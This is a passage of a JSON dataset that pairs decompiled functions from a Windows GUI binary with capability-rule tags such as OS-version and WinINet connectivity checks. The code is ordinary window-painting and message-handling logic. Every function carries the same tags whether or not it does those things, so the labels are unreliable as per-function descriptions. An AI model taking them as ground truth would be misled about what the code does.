            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454e84(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *arg_8h;\n    uStack16 = arg_8h[1];\n    uStack12 = arg_8h[2];\n    uStack8 = arg_8h[3];\n    if (*(in_EAX + 0x232) != 0) {\n        (**(in_EAX + 0x230))(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00454f18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454f18(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (in_EAX[0x6d] != 0) {\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                piVar1 = fcn.004198b4();\n                (**(*piVar1 + 0xb0))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack20 = in_EAX[0x6d];\n        uStack16 = (*(in_EAX + 0x55) & 0x20) != 0;\n        sub.user32.dll_EnumChildWindows(iStack20, fcn.00454ed4, &iStack20);\n        (**(*in_EAX + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "00454f8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454f8c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        fcn.00451ae8(0);\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00455030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455030(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if ((((*(in_EAX + 0x57) == '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x55) & 8) != 0)))) &&\n        (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 0x55) & 8) != 0 || ((*(in_EAX + 0x51) & 4) != 0)))))) ||\n       (((*(in_EAX + 0x15) & 8) != 0 || ((*(in_EAX + 7) & 8) != 0)))) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x6d] == 0) {\n            puStack28 = 0x4550aa;\n            (**(*in_EAX + 0x98))();\n        }\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x4550d2;\n                fcn.004198b4();\n                puStack28 = 0x4550d7;\n                fcn.00455030();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x6d] != 0) && (*(in_EAX + 0x1da) != cVar1)) {\n        *(in_EAX + 0x1da) = cVar1;\n        uStack32 = 0x45512c;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.00451ae8(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 552
    },
    "00455154": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455154(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = in_EAX;\n    do {\n        iVar1 = *(iVar3 + 0x30);\n        if (iVar1 == 0) {\n            if ((*(in_EAX + 0x1c) & 8) == 0) {\n                cVar2 = fcn.004047dc();\n                if ((cVar2 != '\\0') || (*(iVar3 + 0x1c4) != 0)) {\n                    fcn.00455030();\n                }\n            }\n            return;\n        }\n        iVar3 = iVar1;\n    } while (*(iVar1 + 0x1da) != '\\0');\n    *(in_EAX + 0x1da) = 0;\n    return;\n}\n",
        "token_count": 197
    },
    "004551a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004551a4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_4h;\n    \n    if ((in_EAX[0xc] == 0) && (param_2 != in_EAX[0x71])) {\n        if ((in_EAX[0x6d] == 0) || ((in_EAX[0x71] == 0 || (param_2 == 0)))) {\n            fcn.00459934();\n            uVar1 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            (**(*in_EAX + 0xb0))();\n            in_EAX[0x71] = param_2;\n            fcn.00455154();\n            *in_FS_OFFSET = uVar1;\n            fcn.00459934();\n            return;\n        }\n        in_EAX[0x71] = param_2;\n        sub.user32.dll_SetParent();\n        if ((4 < **0x49595c) && (**0x495d18 == 2)) {\n            fcn.00451ae8(0);\n        }\n        fcn.00455154();\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "00455300": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455300(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    uint lprc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418428();\n    *(arg_8h + -0xc) = var_ch;\n    *(arg_8h + -8) = var_8h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar2 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar2 == 0) {\n        bVar3 = false;\n    }\n    else if (((*(in_EAX + 7) & 0x10) == 0) || ((*(in_EAX + 0x57) == '\\0' && ((*(in_EAX + 0x51) & 4) != 0)))) {\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar1 = (**(*in_EAX + 0x50))();\n            if ((cVar1 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                var_4h = CONCAT22(*(arg_8h + -8), *(arg_8h + -0xc));\n                iVar2 = fcn.00451ae8(var_4h);\n                bVar3 = iVar2 != 0;\n                goto code_r0x004553bc;\n            }\n        }\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\ncode_r0x004553bc:\n    if (bVar3) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 426
    },
    "004553cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004553cc(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    var_14h = 0;\n    if (((arg_ch != '\\0') && (*(in_EAX + 0x1d0) != 0)) && (iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1,  -1 < iVar2)) {\n        do {\n            if (arg_8h != '\\0') {\n                arg_ch_00 = 1;\n                arg_8h_00 = 1;\n                fcn.004198b4();\n                var_14h = fcn.004553cc(arg_8h_00, arg_ch_00);\n            }\n            if (var_14h == 0) {\n                puVar3 = &stack0xfffffffc;\n                fcn.004198b4();\n                cVar1 = fcn.00455300(puVar3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (((*(in_EAX + 0x1cc) != 0) && (var_14h == 0)) && (iVar2 = *(*(in_EAX + 0x1cc) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.004198b4();\n            cVar1 = fcn.00455300(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return var_14h;\n}\n",
        "token_count": 461
    },
    "004555dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004555dc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00458594();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x493710 == 0) || (iVar1 = *0x493710,  in_EAX != *(*0x493710 + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        iVar1 = fcn.004553cc(0, 0);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.00451ae8(*(param_2 + 8) - *(iVar1 + 0x40) & 0xffffU | *(param_2 + 10) - *(iVar1 + 0x44) << 0x10);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 251
    },
    "00455bb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455bb0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x1b4) == 0) {\n        fcn.00451e94();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.00451ae8(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.004241dc();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.00424f5c();\n            uVar2 = fcn.004241dc();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.00424f98();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x49ac7c) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x1a8), *(in_EAX + 0x1b4), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.004503cc(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "00455cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455cec(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    uint uStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    uint *puStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    int32_t hdc;\n    uint nSavedDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    hdc = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (hdc == 0) {\n        puStack100 = &fcn.00455cec::var_50h;\n        uStack104 = 0x455d16;\n        uStack104 = fcn.00458594();\n        puStack108 = 0x455d1c;\n        hdc = sub.user32.dll_BeginPaint();\n    }\n    puStack112 = 0x455e4b;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x73] == 0) {\n        iStack120 = 0x455d47;\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xc4))();\n        iStack120 = 0x455e22;\n        fcn.00455e84();\n        *in_FS_OFFSET = iStack116;\n        puStack108 = 0x455e52;\n        if (*(var_8h + 4) == 0) {\n            puStack112 = &fcn.00455cec::var_50h;\n            iStack116 = 0x455e44;\n            iStack116 = fcn.00458594();\n            iStack120 = 0x455e4a;\n            sub.user32.dll_EndPaint();\n        }\n        return;\n    }\n    iStack120 = hdc;\n    puStack124 = 0x455d55;\n    puStack108 = &stack0xfffffffc;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack128 = 0x455e0e;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar4 = 2;\n    iVar3 = *(var_4h[0x73] + 8);\n    puStack124 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack124 = puVar1;\n            iVar2 = fcn.004198b4();\n            if ((((*(iVar2 + 0x57) != '\\0') && (((*(iVar2 + 0x1c) & 0x10) == 0 || ((*(iVar2 + 0x55) & 8) == 0)))) ||\n                (((*(iVar2 + 0x1c) & 0x10) != 0 && (((*(iVar2 + 0x55) & 8) == 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) &&\n               ((*(iVar2 + 0x50) & 0x40) != 0)) {\n                iStack132 = hdc;\n                iVar4 = sub.gdi32.dll_ExcludeClipRect();\n                if (iVar4 == 1) break;\n            }\n            iVar3 = iVar3 + -1;\n            puVar1 = puStack124;\n        } while (iVar3 != 0);\n    }\n    if (iVar4 != 1) {\n        (**(*var_4h + 0xc4))();\n    }\n    *in_FS_OFFSET = iStack132;\n    puStack124 = 0x455e15;\n    uStack128 = nSavedDC;\n    iStack132 = hdc;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 942
    },
    "00455e84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455e84(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *arg_8h;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint *puStack76;\n    uint lprc;\n    int32_t var_18h;\n    uint nSavedDC;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hDC;\n    int32_t var_4h;\n    \n    hDC = param_2;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1dc) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x20))();\n    }\n    if (*(var_4h + 0x1cc) != 0) {\n        var_ch = 0;\n        if (param_1 != 0) {\n            var_ch = fcn.00419910();\n            if (var_ch < 0) {\n                var_ch = 0;\n            }\n        }\n        var_10h = *(*(var_4h + 0x1cc) + 8);\n        if (var_ch < var_10h) {\n            do {\n                var_18h = fcn.004198b4();\n                if (((*(var_18h + 0x57) != '\\0') &&\n                    (((*(var_18h + 0x1c) & 0x10) == 0 || ((*(var_18h + 0x55) & 8) == 0)))) ||\n                   (((*(var_18h + 0x1c) & 0x10) != 0 &&\n                    (((*(var_18h + 0x55) & 8) == 0 && ((*(var_18h + 0x51) & 4) == 0)))))) {\n                    fcn.00418464(&fcn.00455e84::lprc, *(var_18h + 0x44) + *(var_18h + 0x4c));\n                    puStack76 = 0x455fa1;\n                    iVar1 = sub.gdi32.dll_RectVisible();\n                    if (iVar1 != 0) {\n                        if ((*(var_4h + 0x54) & 0x80) != 0) {\n                            *(var_18h + 0x54) = *(var_18h + 0x54) | 0x80;\n                        }\n                        puStack76 = hDC;\n                        puStack80 = 0x455fc4;\n                        nSavedDC = sub.gdi32.dll_SaveDC();\n                        uStack84 = 0x456031;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        puStack80 = &stack0xfffffffc;\n                        fcn.0044ee3c();\n                        sub.gdi32.dll_IntersectClipRect(hDC, 0, 0, *(var_18h + 0x48), *(var_18h + 0x4c));\n                        uVar4 = 0;\n                        fcn.00451ae8(0);\n                        *in_FS_OFFSET = uVar4;\n                        sub.gdi32.dll_RestoreDC(hDC, nSavedDC, 0x456038);\n                        return;\n                    }\n                }\n                var_ch = var_ch + 1;\n            } while (var_ch < var_10h);\n        }\n    }\n    if ((*(var_4h + 0x1d0) != 0) && (iVar1 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        var_ch = 0;\n        do {\n            iVar2 = fcn.004198b4();\n            if (((*(iVar2 + 0x1d9) != '\\0') && ((*(iVar2 + 0x50) & 0x10) != 0)) &&\n               ((((*(iVar2 + 0x1c) & 0x10) == 0 && (*(iVar2 + 0x57) != '\\0')) ||\n                ((((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)) && ((*(iVar2 + 0x55) & 8) == 0)))))) {\n                fcn.004241dc();\n                uVar4 = sub.gdi32.dll_CreateSolidBrush();\n                puStack76 = 0x4560fa;\n                fcn.00418464(&fcn.00455e84::lprc, *(iVar2 + 0x44) + *(iVar2 + 0x4c));\n                puStack76 = &fcn.00455e84::lprc;\n                puStack80 = hDC;\n                uStack84 = 0x456107;\n                sub.user32.dll_FrameRect();\n                uStack88 = 0x45610d;\n                uStack84 = uVar4;\n                sub.gdi32.dll_DeleteObject();\n                uStack88 = 0x456117;\n                uStack88 = fcn.004241dc();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush();\n                iVar2 = *(iVar2 + 0x44) + *(iVar2 + 0x4c) + 1;\n                arg_8h = &fcn.00455e84::lprc;\n                uVar4 = uVar3;\n                fcn.00418464(arg_8h, iVar2);\n                sub.user32.dll_FrameRect(hDC, &fcn.00455e84::lprc, arg_8h, iVar2, uVar4);\n                sub.gdi32.dll_DeleteObject(uVar3);\n            }\n            var_ch = var_ch + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 1397
    },
    "00456214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456214(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t lprc;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint hdc;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    puStack48 = 0x456236;\n    hdc = in_EDX;\n    var_4h = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack52 = 0x45644d;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044ee3c();\n    sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n    iVar5 = 0;\n    iVar4 = 0;\n    uVar2 = fcn.00458594(0xffffffec);\n    uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n    if ((uVar3 & 0x200) == 0) {\n        uVar2 = fcn.00458594(0xfffffff0);\n        uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n        if ((uVar3 & 0x800000) != 0) {\n            iVar4 = 3;\n            iVar5 = 0xa00f;\n        }\n    }\n    else {\n        iVar4 = 10;\n        iVar5 = 0x200f;\n    }\n    if (iVar4 == 10) {\n        fcn.004321c4();\n        cVar1 = fcn.004322cc();\n        if ((cVar1 != '\\0') && (((*(var_4h + 0x1c) & 0x10) == 0 || (cVar1 = fcn.0043216c(),  cVar1 == '\\0')))) {\n            sub.user32.dll_SetRect(&fcn.00456214::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n            if ((*(var_4h + 0x52) & 2) == 0) {\n                *(var_4h + 0x50) = *(var_4h + 0x50) | *0x456468;\n                fcn.00456164();\n                *(var_4h + 0x50) = ~*0x456468 & *(var_4h + 0x50);\n            }\n            else {\n                fcn.00456164();\n            }\n            fcn.0044ee3c();\n            sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n            goto code_r0x004563cd;\n        }\n    }\n    if (iVar5 != 0) {\n        sub.user32.dll_SetRect(&fcn.00456214::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n        sub.user32.dll_DrawEdge(hdc, &fcn.00456214::lprc, iVar4, iVar5);\n        fcn.0044ee3c();\n        sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n    }\ncode_r0x004563cd:\n    fcn.00451ae8(0);\n    uVar2 = 0;\n    fcn.00451ae8(0);\n    if ((*(var_4h + 0x1d0) != 0) && (iVar4 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar4 + -1)) {\n        do {\n            iVar5 = fcn.004198b4();\n            if (*(iVar5 + 0x57) != '\\0') {\n                uVar2 = *(iVar5 + 0x44);\n                fcn.00456214(uVar2);\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x456454);\n    return;\n}\n",
        "token_count": 1115
    },
    "00456830": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456830(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.004321c4();\n    cVar1 = fcn.004322cc();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x90) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.00424f98();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else if (*(in_EAX[0xc] + 0x240) == '\\0') {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.00458594();\n        fcn.004323cc(uVar2, arg_ch, arg_10h);\n    }\n    else {\n        fcn.0044d588();\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 326
    },
    "00456e00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456e00(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00418440();\n    iVar1 = fcn.00451ae8(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1e2) != 0)) {\n        (**(in_EAX + 0x1e0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00456e50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456e50(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ea) != 0) {\n        (**(in_EAX + 0x1e8))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00456f80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456f80(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.00458594();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x202) != 0) {\n        (**(in_EAX + 0x200))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00456fdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00456fdc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00456f48();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.004198b4();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 145
    },
    "004570bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004570bc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x457164;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1dc)) && (*(in_EAX + 0x1dc) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.0044e13c();\n        if (param_2 == '\\0') {\n            fcn.00404650();\n            *(in_EAX + 0x1ac) = 0;\n            fcn.0040700c();\n        }\n        else {\n            if (*(in_EAX + 0x1ac) == 0) {\n                uVar1 = fcn.00404620();\n                *(in_EAX + 0x1ac) = uVar1;\n            }\n            fcn.0040484c();\n            fcn.00407024();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x45716b;\n    uStack28 = 0x457163;\n    fcn.0040700c();\n    